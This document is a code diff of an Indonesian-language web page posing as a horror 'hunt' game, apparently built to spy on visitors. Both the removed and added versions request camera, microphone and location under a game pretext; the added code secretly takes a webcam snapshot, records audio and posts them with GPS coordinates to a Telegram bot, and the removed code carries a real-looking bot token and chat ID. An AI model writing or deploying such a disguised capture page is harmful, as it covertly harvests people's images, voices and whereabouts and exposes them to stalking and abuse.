@@ -1,213 +1,361 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Real Horror Survival</title>
-    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
-    <style>
-        body {
-            background-color: #0c0c0c;
-            color: #f0f0f0;
-            text-align: center;
-            overflow: hidden;
-            height: 100vh;
-            margin: 0;
-        }
-        h1 {
-            margin-top: 20px;
-            font-size: 2.5em;
-            text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.7);
-        }
-        button {
-            margin-top: 20px;
-        }
-        #loading {
-            display: none;
-            font-size: 1.5em;
-            margin-top: 20px;
-        }
-        #cameraContainer {
-            display: none;
-            position: relative;
-            width: 100%;
-            height: 100%;
-            margin: 0 auto;
-        }
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            border: 2px solid #e63946;
-        }
-        .mic-icon {
-            font-size: 2em;
-            color: red;
-            display: none;
-            position: absolute;
-            bottom: 10px;
-            left: 10px;
-        }
-        .location {
-            margin-top: 20px;
-            font-size: 1.2em;
-            color: white;
-        }
-        #permissionContainer {
-            display: block;
-        }
-        #countdown {
-            font-size: 3em;
-            color: red;
-            margin-top: 20px;
-        }
-        #countdownContainer {
-            display: none;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Horror Ambatukam Hunt</title>
+  <style>
+    /* --- Pengaturan Dasar --- */
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: black;
+      font-family: Arial, sans-serif;
+      height: 100vh;
+      overflow: hidden;
+      position: relative;
+    }
+    /* Background video */
+    #bgVideo {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: -2;
+    }
+    /* Konten Sambutan (intro) — ditampilkan di belakang overlay */
+    #introText {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      text-align: center;
+      color: white;
+      z-index: 1;  /* Di bawah overlay */
+    }
+    #introText h1 {
+      font-size: 3em;
+      margin-bottom: 10px;
+    }
+    #introText p {
+      font-size: 1.2em;
+      margin-bottom: 20px;
+    }
+    /* Tombol di halaman sambutan */
+    #startGameBtn {
+      padding: 10px 30px;
+      background-color: red;
+      color: white;
+      border: none;
+      font-size: 1.2em;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    #startGameBtn:hover {
+      background-color: darkred;
+    }
+    /* Kontainer foto (game) — tidak tampil saat sambutan */
+    #photoContainer {
+      display: none;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      text-align: center;
+      z-index: 1;
+    }
+    #photoContainer img {
+      max-width: 80%;
+      height: auto;
+      margin-bottom: 20px;
+    }
+    /* Tombol “Lanjut” (di game) */
+    #nextBtn {
+      display: none;
+      padding: 10px 30px;
+      background-color: green;
+      color: white;
+      border: none;
+      font-size: 1.2em;
+      cursor: pointer;
+      border-radius: 5px;
+      position: absolute;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 11;
+    }
+    #nextBtn:hover {
+      background-color: darkgreen;
+    }
+    /* Overlay Darkness & Spotlight */
+    .darkness {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      pointer-events: none; /* biarkan interaksi pada konten di belakang */
+      z-index: 10;
+    }
+    .light {
+      position: absolute;
+      width: 300px;
+      height: 300px;
+      border-radius: 50%;
+      /* Box-shadow besar untuk menggelapkan seluruh layar kecuali area lingkaran */
+      box-shadow: 400vh 0px 0px 400vw rgba(0,0,0,0.99);
+    }
+    .shadow {
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      box-shadow: inset 4px 0 37px 53px rgba(0,0,0,0.9);
+    }
+    /* End Popup (pada game) */
+    #endPopup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: rgba(0,0,0,0.8);
+      padding: 30px;
+      border-radius: 10px;
+      text-align: center;
+      color: white;
+      z-index: 12;
+    }
+    #endPopup h2 {
+      margin-bottom: 20px;
+    }
+    #endPopup button {
+      padding: 10px 30px;
+      margin: 10px;
+      font-size: 1.2em;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      color: white;
+    }
+    #endPopup #noBtn {
+      background-color: red;
+    }
+    #endPopup #noBtn:hover {
+      background-color: darkred;
+    }
+    #endPopup #yesBtn {
+      background-color: green;
+    }
+    #endPopup #yesBtn:hover {
+      background-color: darkgreen;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Selamat datang di Real Horror Survival!</h1>
-        <p>Untuk memulai permainan, Anda harus memberikan izin kepada situs ini untuk mengakses kamera, mikrofon, dan lokasi Anda.</p>
-        
-        <div id="permissionContainer">
-            <button class="btn btn-danger btn-lg" onclick="requestPermissions()">Izinkan dan Mulai</button>
-        </div>
+  <!-- Background Video -->
+  <video id="bgVideo" autoplay loop muted>
+    <source src="rented-bunny.gif" type="video/gif" />
+  </video>
 
-        <div id="loading">Loading... Persiapkan diri Anda, permainan dimulai segera!</div>
+  <!-- Konten Sambutan (Intro) — ditempatkan di belakang overlay -->
+  <div id="introText">
+    <h1>Selamat datang di Horror Ambatukam Hunt</h1>
+    <p>Izinkan semua kamera, lokasi, dan suara untuk lanjut bermain game ini</p>
+    <button id="startGameBtn">Izinkan dan Mulai</button>
+  </div>
 
-        <div id="cameraContainer">
-            <video id="video" autoplay></video>
-            <div class="mic-icon" id="micIcon">🎤</div>
-            <div class="location" id="locationDisplay"></div>
-        </div>
+  <!-- Kontainer Game (Foto & Lanjut) -->
+  <div id="photoContainer">
+    <img id="photoSlide" src="" alt="Ambatukam Image" />
+  </div>
+  <button id="nextBtn">Lanjut</button>
 
-        <div id="countdownContainer">
-            <div id="countdown">10</div>
-        </div>
+  <!-- Overlay Darkness & Spotlight -->
+  <div class="darkness" id="darkness">
+    <div class="light" id="light">
+      <div class="shadow"></div>
     </div>
+  </div>
 
-    <script>
-        let videoStream;
-        let mediaRecorder;
-        let audioChunks = [];
-        let locationData = {};
-        let countdownValue = 10;
-        let countdownInterval;
-        let botToken = "8155174745:AAEVSM6KjUCejQ9dxCNLyo0D0Wh_eXgfHQ8"; // Token bot Telegram kamu
-        let chatId = "6010073048"; // ID pengguna Telegram kamu
+  <!-- End Popup (setelah foto terakhir) -->
+  <div id="endPopup">
+    <h2>Apakah kamu menemukan ambatukam :0?</h2>
+    <button id="noBtn">Enggak</button>
+    <button id="yesBtn">Iya</button>
+  </div>
 
-        async function requestPermissions() {
-            // Tampilkan pesan loading setelah izin diberikan
-            document.getElementById("loading").style.display = "block";
-            document.getElementById("permissionContainer").style.display = "none";
+  <!-- Musik Latar -->
+  <audio id="horrorMusic" autoplay loop>
+    <source src="Y2meta - d2a9a585f47c840.mp4" type="audio/mp3" />
+    Your browser does not support the audio element.
+  </audio>
 
-            // Minta izin untuk akses kamera dan mikrofon
-            try {
-                videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                document.getElementById("loading").style.display = "none";
-                document.getElementById("cameraContainer").style.display = "block";
-                document.getElementById("video").srcObject = videoStream;
+  <script>
+    // Array foto yang akan ditampilkan pada game
+    const photos = [
+      "photo1.jpg", "photo2.jpg", "photo3.jpg", "photo4.jpg", "photo5.jpg",
+      "photo6.jpg", "photo7.jpg", "photo8.jpg", "photo9.png"
+    ];
+    let currentPhotoIndex = 0;
+    let videoStream;
 
-                // Mulai rekam suara
-                mediaRecorder = new MediaRecorder(videoStream);
-                mediaRecorder.onstart = () => {
-                    document.getElementById("micIcon").style.display = "block";
-                    setInterval(() => {
-                        document.getElementById("micIcon").style.opacity = document.getElementById("micIcon").style.opacity === "1" ? "0.5" : "1";
-                    }, 500);
-                };
-                mediaRecorder.ondataavailable = event => {
-                    audioChunks.push(event.data);
-                };
-                mediaRecorder.start();
+    // Ambil elemen penting
+    const introText = document.getElementById('introText');
+    const startGameBtn = document.getElementById('startGameBtn');
+    const photoContainer = document.getElementById('photoContainer');
+    const photoSlide = document.getElementById('photoSlide');
+    const nextBtn = document.getElementById('nextBtn');
+    const endPopup = document.getElementById('endPopup');
+    const noBtn = document.getElementById('noBtn');
+    const yesBtn = document.getElementById('yesBtn');
 
-                // Dapatkan lokasi
-                navigator.geolocation.watchPosition(position => {
-                    locationData = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude
-                    };
-                    document.getElementById("locationDisplay").innerText = `Lokasi Anda: ${locationData.latitude}, ${locationData.longitude}`;
-                });
+    // Event listener untuk tombol popup akhir (setelah foto terakhir)
+    noBtn.addEventListener('click', () => {
+      window.location.href = 'https://youtu.be/8241aX1ArU0?si=mehpHFjZE3lXF4Y1';
+    });
+    yesBtn.addEventListener('click', () => {
+      const message = encodeURIComponent("HALO OWNER, AKU MENEMUKAN AMBATUKAM DI GEM HORROR KAMU, AKU KIRIM BUKTI SCREENSHOTNYA... JANGAN LUPA REWARD NYA YA :D");
+      window.location.href = `https://wa.me/6281319865384?text=${message}`;
+    });
 
-                // Tampilkan countdown setelah izin diberikan
-                startCountdown();
+    // Mulai game saat tombol "Izinkan dan Mulai" ditekan pada halaman sambutan
+    startGameBtn.addEventListener('click', async () => {
+      // Sembunyikan konten sambutan (intro)
+      introText.style.display = 'none';
+      await startGame();
+    });
 
-            } catch (error) {
-                console.error("Akses ditolak atau terjadi kesalahan:", error);
-                alert("Akses ditolak. Anda tidak bisa melanjutkan permainan.");
-            }
-        }
+    async function startGame() {
+      try {
+        // Minta akses kamera dan audio
+        videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        // Minta akses lokasi
+        const location = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject);
+        });
 
-        function startCountdown() {
-            document.getElementById("countdownContainer").style.display = "block";
-            countdownInterval = setInterval(() => {
-                document.getElementById("countdown").textContent = countdownValue;
-                countdownValue--;
+        alert("Misi Kamu: Carikan Ambatukam dibalik objek yang menghalangi (DILIAT BAIK-BAIK). Jika ketemu screenshot ambatukam itu, kirimkan ke pencipta permainan ini untuk mendapatkan hadiah spesial.");
 
-                if (countdownValue < 0) {
-                    clearInterval(countdownInterval);
-                    // Arahkan pengguna ke video YouTube
-                    window.location.href = "https://youtu.be/xvFZjo5PgG0?si=SXv6a7xY6dLFV2ml";
-                }
-            }, 1000);
-        }
+        // Tangkap foto dan audio untuk dikirim ke Telegram
+        capturePhotoAndAudio(location.coords);
+        // Tampilkan kontainer game (foto) dan tombol "Lanjut"
+        photoContainer.style.display = 'block';
+        nextBtn.style.display = 'block';
+        showPhoto(currentPhotoIndex);
 
-        function captureAndSend() {
-            // Ambil foto
-            const video = document.getElementById("video");
-            const canvas = document.createElement("canvas");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const photoData = canvas.toDataURL("image/png");
+      } catch (error) {
+        alert("Akses ditolak. Game tidak bisa dilanjutkan.");
+      }
+    }
 
-            // Kirim foto, suara, dan lokasi ke Telegram
-            sendToTelegram([photoData]);
-        }
+    function capturePhotoAndAudio(coords) {
+      const video = document.createElement("video");
+      video.srcObject = videoStream;
+      video.play();
 
-        function sendToTelegram(photos) {
-            // Konversi foto menjadi Blob
-            let photoBlobs = photos.map(photoData => dataURItoBlob(photoData));
+      const mediaRecorder = new MediaRecorder(videoStream);
+      mediaRecorder.start();
 
-            const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
-            const formData = new FormData();
-            formData.append("chat_id", chatId);
+      let audioChunks = [];
+      mediaRecorder.ondataavailable = event => {
+        audioChunks.push(event.data);
+      };
 
-            // Kirim foto
-            photoBlobs.forEach((blob, index) => {
-                formData.append("photo", blob, `photo${index + 1}.png`);
-            });
+      // Setelah 5 detik, ambil snapshot dan hentikan perekaman audio
+      setTimeout(() => {
+        const canvas = document.createElement("canvas");
+        canvas.width = 640;
+        canvas.height = 480;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL("image/png");
 
-            // Kirim audio
-            formData.append("audio", audioBlob, "audio.webm");
+        mediaRecorder.stop();
+        mediaRecorder.onstop = () => {
+          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+          sendToTelegram(imageData, coords, audioBlob);
+        };
+      }, 5000);
+    }
 
-            // Kirim lokasi
-            formData.append("latitude", locationData.latitude);
-            formData.append("longitude", locationData.longitude);
+    function sendToTelegram(imageData, location, audioBlob) {
+      // Contoh: kirim lokasi
+      fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendLocation`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: "YOUR_CHAT_ID",
+          latitude: location.latitude,
+          longitude: location.longitude
+        })
+      });
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            }).then(response => {
-                console.log("Data terkirim ke Telegram.");
-            }).catch(err => {
-                console.error("Gagal mengirim data ke Telegram:", err);
-            });
-        }
+      // Kirim foto
+      const photoBlob = dataURItoBlob(imageData);
+      const formDataPhoto = new FormData();
+      formDataPhoto.append("chat_id", "YOUR_CHAT_ID");
+      formDataPhoto.append("photo", photoBlob, "image.png");
 
-        function dataURItoBlob(dataURI) {
-            const byteString = atob(dataURI.split(',')[1]);
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            return new Blob([ab], { type: 'image/png' });
-        }
-    </script>
+      fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendPhoto`, {
+        method: "POST",
+        body: formDataPhoto
+      });
+
+      // Kirim audio
+      const formDataAudio = new FormData();
+      formDataAudio.append("chat_id", "YOUR_CHAT_ID");
+      formDataAudio.append("audio", audioBlob, "audio.webm");
+
+      fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendAudio`, {
+        method: "POST",
+        body: formDataAudio
+      });
+    }
+
+    function dataURItoBlob(dataURI) {
+      const byteString = atob(dataURI.split(',')[1]);
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      return new Blob([ab], { type: 'image/png' });
+    }
+
+    function showPhoto(index) {
+      photoSlide.src = photos[index];
+    }
+
+    // Saat tombol "Lanjut" ditekan:
+    // Jika belum di foto terakhir, tampilkan foto berikutnya.
+    // Jika sudah di foto terakhir, tampilkan popup akhir.
+    nextBtn.addEventListener('click', () => {
+      if (currentPhotoIndex === photos.length - 1) {
+        endPopup.style.display = 'block';
+      } else {
+        currentPhotoIndex++;
+        showPhoto(currentPhotoIndex);
+      }
+    });
+
+    // Update posisi "light" (spotlight) sesuai gerakan kursor/touch
+    const light = document.getElementById('light');
+    function update(e) {
+      let x, y;
+      if (e.touches && e.touches.length > 0) {
+        x = e.touches[0].clientX - 150;
+        y = e.touches[0].clientY - 150;
+      } else {
+        x = e.clientX - 150;
+        y = e.clientY - 150;
+      }
+      light.style.transform = `translate(${x}px, ${y}px)`;
+    }
+    document.addEventListener('mousemove', update);
+    document.addEventListener('touchmove', update);
+  </script>
 </body>
 </html>
